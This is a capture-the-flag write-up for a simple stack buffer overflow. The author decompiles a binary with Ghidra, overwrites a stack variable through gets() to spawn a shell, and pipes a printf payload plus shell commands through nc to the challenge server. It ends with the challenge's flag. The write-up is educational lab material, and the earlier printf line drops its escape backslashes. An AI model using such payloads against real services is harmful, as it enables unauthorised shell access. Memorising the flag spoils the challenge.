First I decompiled the binary through ghidra.

Through this I found that a variable (let us call it `vuln`) that is declared as `0xdeadbeef` is checked against `0xcafebabe`. If this gives true, the program runs a shell (\bin\sh). The program also asks the user for an input through gets() to a variable (let us call it `inp`) that has a buffer of 32. `vuln` and `inp` are 52 elements apart in the stack.

gets() does not stop taking input until it reaches a newline or null character. Hence we can push an input of size 52 and the pointer will reach `vuln`. If we input a few more characters we can also overwrite the data stored in `vuln`.
>This is how a buffer overflow works

So I created custom input to replace 0xdeadbeef with 0xcafebabe with 52 'A's to reach `vuln` and then 0xcafebabe in little endian(order of bytes is reversed) to overwrite it with the dersired value.

```
printf AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAxbexbaxfexca\n
```

I initially tried piping 'python3 -c "print(input)"' to binary.
This did not work properly leaving random values like c2 between each byte of the overwrite. I googled it and found out that its because python uses a different encoding.
In the end I decided to go with printf cli command and it passed the conditional.

My next hurdle was trying to get it working with the server, but it wasnt working properly.
After a few hours of trying and even contacting the mods to see if server is working, i realised its because the entire string goes to gets() and nothing goes to the shell as it spawns later.
So i added a sleep command to make it wait for the shell to open and sent the commands after that.

``` 
(printf 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xbe\xba\xfe\xca\n\n'; sleep 1 ; printf 'ls -a\ncat flag\n') | nc iitmandi.co.in 12000
```
OUTPUT: `daddy, I just pwned a buFFer :)`
submitted as flag within aetherius{}

# Flag
```aetherius{daddy, I just pwned a buFFer :)}```